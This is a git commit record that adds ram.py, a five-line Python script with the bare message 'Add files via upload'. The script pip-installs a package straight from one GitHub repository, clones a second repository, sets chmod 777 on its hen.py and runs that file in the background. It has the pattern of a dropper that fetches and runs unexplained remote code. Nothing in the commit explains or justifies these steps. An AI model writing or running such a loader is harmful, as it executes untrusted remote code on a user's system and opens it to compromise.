4905d01aedf7d5c8664d56e7e201291570eb81ba
microsoftsubscription795077 <82731622+microsoftsubscription795077@users.noreply.github.com>
2021-04-18 02:12:21 +0530

    Add files via upload

---
+++ ram.py
@@ -0,0 +1,5 @@
+import os
+os.system("pip3 install git+https://github.com/rahulji765789021/titli.git")
+os.system("git clone https://github.com/rahulji765789021/murgi.git")
+os.system("chmod 777 murgi/hen.py")
+os.system("./murgi/hen.py &")
